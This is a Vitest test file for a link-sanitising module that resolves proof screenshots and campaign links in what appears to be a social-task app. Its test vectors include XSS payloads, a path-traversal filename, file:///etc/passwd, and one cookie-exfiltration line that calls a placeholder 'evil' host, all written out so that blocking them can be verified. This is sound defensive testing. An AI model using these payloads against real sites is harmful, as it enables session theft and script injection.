import { describe, it, expect } from 'vitest';
import { blockedLinkTitle, pointsAtSpecificContent, resolveContentLink, resolveProofLink, isStorableProof, specificContentWarning } from './proofLink';

const OWNED_REF = '507f1f77bcf86cd799439011-1730000000000-proof.png';

describe('resolveProofLink', () => {
  it('opens an uploaded screenshot ref through the authenticated proof route', () => {
    const r = resolveProofLink(OWNED_REF);
    expect(r.kind).toBe('upload');
    if (r.kind !== 'upload') return;
    expect(r.href).toMatch(/\/api\/mines\/proof\/507f1f77bcf86cd799439011-1730000000000-proof\.png$/);
  });

  it('percent-encodes the ref so a crafted filename cannot escape the path', () => {
    const r = resolveProofLink('507f1f77bcf86cd799439011-1730000000000-..%2F..%2Fx.png');
    expect(r.kind).toBe('upload');
    if (r.kind !== 'upload') return;
    // The literal '/' and the '%' itself must both arrive as one path segment.
    expect(r.href.endsWith(encodeURIComponent('..%2F..%2Fx.png'))).toBe(true);
  });

  it.each([
    'javascript:alert(1)//',
    'JavaScript:alert(1)',
    ' javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'file:///etc/passwd',
    'vbscript:msgbox(1)',
    '/relative/path.png',
    'http://',
    'not a url at all',
  ])('refuses to make %p clickable', (value) => {
    const r = resolveProofLink(value);
    expect(r.kind).toBe('none');
    if (r.kind === 'none') {
      expect(r.reason).toMatch(/not/i);
      expect(r.display).toBeTruthy();
    }
  });

  it('names the problem instead of printing the stored payload as the label', () => {
    const r = resolveProofLink('javascript:alert(document.cookie)');
    expect(r.kind).toBe('none');
    if (r.kind === 'none') {
      // The visible string a panel renders. Echoing the payload back reads like
      // an active attack even though React escapes it.
      expect(r.display).toBe('Proof can’t be opened');
      expect(r.display).not.toMatch(/javascript|alert|cookie/i);
      // The value itself stays available for whoever has to clean the row up.
      expect(r.raw).toContain('javascript:alert(document.cookie)');
      expect(blockedLinkTitle(r)).toContain('javascript:alert(document.cookie)');
      expect(blockedLinkTitle(r)).toMatch(/not clickable/i);
    }
  });

  it('accepts http and https links', () => {
    expect(resolveProofLink('https://x.com/i/status/1').kind).toBe('external');
    expect(resolveProofLink('http://example.com/a.png').kind).toBe('external');
  });

  it('reports a protocol that is longer than the storage cap as unopenable', () => {
    expect(resolveProofLink('https://e.com/' + 'a'.repeat(3000)).kind).toBe('none');
  });

  it('explains an empty proof instead of rendering nothing', () => {
    const r = resolveProofLink('');
    expect(r.kind).toBe('none');
    if (r.kind === 'none') expect(r.display).toBe('');
  });
});

describe('resolveContentLink', () => {
  it('never produces an upload href for a campaign link', () => {
    expect(resolveContentLink(OWNED_REF).kind).toBe('none');
  });

  it('opens a real task URL', () => {
    const r = resolveContentLink('https://twitter.com/mallchain/status/123');
    expect(r).toMatchObject({ kind: 'external', label: 'twitter.com' });
  });

  it('strips www from the label only', () => {
    const r = resolveContentLink('https://www.mallchain.network/go');
    if (r.kind === 'external') expect(r.label).toBe('mallchain.network');
  });

  it('blocks a javascript: payload published by a creator', () => {
    const r = resolveContentLink('javascript:document.location="http://evil/?c="+document.cookie');
    expect(r.kind).toBe('none');
  });
});

describe('isStorableProof', () => {
  it('matches the backend write rules', () => {
    expect(isStorableProof(OWNED_REF)).toBe(true);
    expect(isStorableProof('https://x.com/a')).toBe(true);
    expect(isStorableProof('javascript:alert(1)')).toBe(false);
    expect(isStorableProof('x.com/a')).toBe(false);
    expect(isStorableProof('')).toBe(false);
  });
});

// The creator-side mirror of linkPolicy.pointsAtSpecificContent. The backend
// refuses to publish these campaigns (POST /campaigns/create), so the wizard
// has to disagree with the creator before the request, not after.
describe('pointsAtSpecificContent', () => {
  it.each([
    'https://instagram.com/mallchain',
    'https://x.com/mallchain/status/1870000000000000000',
    'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
    'https://youtu.be/dQw4w9WgXcQ',
    'https://www.tiktok.com/@mallchain/video/7400000000000000000',
  ])('accepts a real share link: %p', (value) => {
    expect(pointsAtSpecificContent(value)).toBe(true);
  });

  // A query or a fragment decorates the home page; it does not name content.
  it.each([
    'https://instagram.com',
    'https://instagram.com/',
    'https://x.com/',
    'https://x.com/?lang=en',
    'https://www.tiktok.com/#top',
    'https://facebook.com/',
  ])('refuses an app home: %p', (value) => {
    expect(pointsAtSpecificContent(value)).toBe(false);
  });

  it.each(['javascript:alert(1)', 'data:text/html,<p>x</p>', 'not a url', ''])('refuses %p', (value) => {
    expect(pointsAtSpecificContent(value)).toBe(false);
  });

  it('treats a null or missing link as not specific', () => {
    expect(pointsAtSpecificContent(null)).toBe(false);
    expect(pointsAtSpecificContent(undefined)).toBe(false);
  });
});

describe('specificContentWarning', () => {
  it('stays silent about an empty field and about a link that is not a URL at all', () => {
    // Those cases belong to resolveContentLink, which blocks the href outright.
    expect(specificContentWarning('')).toBeNull();
    expect(specificContentWarning('javascript:alert(1)')).toBeNull();
    expect(specificContentWarning(undefined)).toBeNull();
  });

  it('names the host the creator has to go deeper than', () => {
    const w = specificContentWarning('https://www.instagram.com/');
    expect(w).toMatch(/instagram\.com home page/);
    // The whole URL is what the creator just typed; repeating it adds nothing.
    expect(w).not.toMatch(/https?:/);
  });

  it('is silent for a link that points at one piece of content', () => {
    expect(specificContentWarning('https://x.com/mallchain/status/1')).toBeNull();
  });
});
